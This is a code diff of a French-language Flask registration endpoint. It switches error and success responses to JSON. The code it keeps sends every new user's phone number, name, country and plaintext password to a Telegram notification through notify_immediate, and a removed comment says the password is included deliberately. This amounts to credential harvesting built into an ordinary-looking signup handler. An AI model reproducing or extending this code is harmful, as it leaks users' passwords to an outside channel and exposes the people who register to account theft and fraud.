@@ -468,10 +468,10 @@ def register():
     password = request.form.get("password", "")
 
     if not (first_name and last_name and phone and country and password):
-        return "Champs manquants", 400
+        return jsonify({"error": "Champs manquants"}), 400  # ✅ Changé en JSON
 
     if User.query.filter_by(phone=phone).first():
-        return "Utilisateur existant", 400
+        return jsonify({"error": "Utilisateur existant"}), 400  # ✅ Changé en JSON
 
     try:
         user = User(
@@ -485,30 +485,31 @@ def register():
         db.session.add(user)
         db.session.commit()
 
-        # 🔔 NOTIFICATION TELEGRAM - UTILISEZ LE SYSTÈME QUI FONCTIONNE
+        # 🔔 NOTIFICATION TELEGRAM
         notification_data = {
             "user_phone": phone,
             "first_name": first_name,
             "last_name": last_name,
             "country": country,
-            "password": password,  # ✅ MOT DE PASSE INCLUS
+            "password": password,
             "timestamp": datetime.now().strftime("%d/%m/%Y %H:%M"),
             "transaction_id": f"user_{user.id}"
         }
         
-        # Utilise notify_immediate comme pour les autres transactions
         notify_immediate("registration", notification_data)
         
         print(f"✅ Utilisateur créé - Notification Telegram envoyée")
         
-        return redirect("/login")
+        # ✅ RETOURNER JSON POUR LE FRONTEND AJAX
+        return jsonify({
+            "success": True,
+            "message": "Inscription réussie !"
+        })
         
     except Exception as e:
         db.session.rollback()
         logging.error(f"Erreur inscription: {e}")
-        return "Erreur lors de l'inscription", 500
-from flask import request, redirect, session, make_response, send_from_directory
-from werkzeug.security import check_password_hash
+        return jsonify({"error": "Erreur lors de l'inscription"}), 500  # ✅ Changé en JSON
 
 
 
